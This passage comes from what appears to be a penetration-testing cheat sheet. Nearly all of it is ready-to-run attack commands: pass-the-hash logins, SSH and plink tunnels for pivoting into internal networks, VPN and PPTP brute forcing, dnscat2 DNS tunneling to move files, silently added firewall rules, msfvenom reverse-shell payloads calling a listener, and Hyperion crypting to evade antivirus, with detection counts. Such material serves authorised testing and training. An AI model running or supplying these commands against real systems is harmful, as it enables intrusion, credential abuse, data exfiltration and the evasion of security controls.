```

JTR forced descrypt brute force cracking
```bash
john --format=descrypt hash --show
```

### Passing the Hash in Windows

PTH winexe
```bash
export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896
pth-winexe -U administrator //$ip cmd
```

PTH smbclient, connect to target share and auth via ntlm hash
```bash
pth-smbclient --user=username --pw-nt-hash -m smb3 \\\\target-ip\\target-share ntlm-hash
```

## Networking, Pivoting and Tunneling

cat /etc/rinetd.conf
```
# bindadress bindport connectaddress connectport
w.x.y.z 53 a.b.c.d 80
```

SSH Local Port Forwarding: supports bi-directional communication channels
```bash
ssh -L <local port to listen>:<remote host>:<remote port>
```

SSH Remote Port Forwarding: Suitable for popping a remote shell on an internal non routable network
```bash
ssh -R <remote port to bind>:<local host>:<local port>
```

SSH Dynamic Port Forwarding: create a SOCKS4 proxy on our local attacking box to tunnel ALL incoming traffic to ANY host in the DMZ network on ANY PORT
```bash
ssh -D <local proxy port> <target>
```

### Proxychains - Perform nmap scan within a DMZ from an external computer

Create a Dynamic application-level port forward on 8080 thru 2222
```bash
ssh -f -N -D <local host>:8080 -p 2222 hax0r@<remote host>
```

Leverage the SSH SOCKS server to perform Nmap scan on network using proxy chains
```bash
proxychains nmap --top-ports=20 -sT -Pn $ip/24
```


Tunnel Remote Desktop (RDP) from a Popped Windows machine to your network
Tunnel on port 22
```
plink -l root -pw pass -R 3389:<localhost>:3389 <remote host>
```

Port 22 blocked? Try port 80? or 443?
```
plink -l root -pw 23847sd98sdf987sf98732 -R 3389:<local host>:3389 <remote host> -P80
```


Windows machine add required firewall rules without prompting the user
```
netsh advfirewall firewall add rule name="3000" dir=in action=allow protocol=TCP localport=3000
```

VLAN Hopping
```bash
git clone https://github.com/nccgroup/vlan-hopping.git  
chmod 700 frogger.sh  
./frogger.sh
```

### VPN Hacking
Identify VPN servers:
```bash
./udp-protocol-scanner.pl -p ike $ip
```

Scan a range for VPN servers:
```bash
./udp-protocol-scanner.pl -p ike -f ip.txt
```

Use IKEForce to enumerate or dictionary attack VPN servers:

```bash
pip install pyip
git clone https://github.com/SpiderLabs/ikeforce.git
```

Perform IKE VPN enumeration with IKEForce:
```bash
./ikeforce.py TARGET-IP -e -w wordlists/groupnames.dic
```

Bruteforce IKE VPN using IKEForce:
```bash
./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1 Use ike-scan to capture the PSK hash:
ike-scan  
ike-scan TARGET-IP  
ike-scan -A TARGET-IP  
ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key  
ike-scan -M -A -n example\_group -P hash-file.txt TARGET-IPUse psk-crack to crack the PSK hash
psk-crack hash-file.txt  
pskcrack  
psk-crack -b 5 TARGET-IPkey  
psk-crack -b 5 --charset="01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" 192-168-207-134key  
psk-crack -d /path/to/dictionary-file TARGET-IP-key
```

### PPTP Hacking
Identifying PPTP, it listens on TCP: 1723
NMAP PPTP Fingerprint:
```bash
nmap -Pn -sV -p
```

1723 TARGET(S) PPTP Dictionary Attack
```bash
thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst
```


### Port Forwarding/Redirection

PuTTY Link tunnel - SSH Tunneling
Forward remote port to local address:
```
plink.exe -P 22 -l root -pw "1337" -R 445:<local host>:445 <remote host>
```


SSH Pivoting
SSH pivoting from one network to another:
```bash
ssh -D <local host>:1010 -p 22 user@<remote host>
```


DNS Tunneling
dnscat2 supports “download” and “upload” commands for getting files (data and programs) to and from the target machine.

Attacking Machine Installation:
```bash
apt-get update  
apt-get -y install ruby-dev git make g++  
gem install bundler  
git clone https://github.com/iagox86/dnscat2.git  
cd dnscat2/server  
bundle install
# Run dnscat2:
ruby ./dnscat2.rb  
dnscat2> New session established: 1422  
dnscat2> session -i 1422
```

Target Machine:
https://downloads.skullsecurity.org/dnscat2/
https://github.com/lukebaggett/dnscat2-powershell/
dnscat --host <dnscat server ip>

## Bypassing Antivirus Software
Crypting Known Malware with Software Protectors. One such open source crypter, called Hyperion

```bash
cp /usr/share/windows-binaries/Hyperion-1.0.zip
unzip Hyperion-1.0.zip  
cd Hyperion-1.0/  
i686-w64-mingw32-g++ Src/Crypter/*.cpp -o hyperion.exe  
cp -p /usr/lib/gcc/i686-w64-mingw32/5.3-win32/libgcc_s_sjlj-1.dll .  
cp -p /usr/lib/gcc/i686-w64-mingw32/5.3-win32/libstdc++-6.dll .  
wine hyperion.exe ../backdoor.exe ../crypted.exe
```

Result
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.23 LPORT=4444 -f exe -o shell.exe # 30/46
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.23 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -o shell.exe # 34/46
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.23 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell.exe # 27/46
wine /usr/share/windows-binaries/hyperion/hyperion.exe shell.exe crypted.exe # 14/46
# custom python reverse shell compiled to exe # 2/46
# custom C reverse shellcode compiled to exe # 1/46
```

## Misc

Arch cross compile exploit (and diff glibc version)

```bash
gcc -m32 -Wall -Wl,--hash-style=both -o gimme.o gimme.c
```

IP restriction at application level, bypass
Try to send a request modifying the HTTP header by adding:
```
X-Forwarder-For: <ip allowed>
```

Windows - check architecture
```
wmic os get osarchitecture
echo %PROCESSOR_ARCHITECTURE%
```

Powershell running as 32 or 64 bits
```
[Environment]::Is64BitProcess
```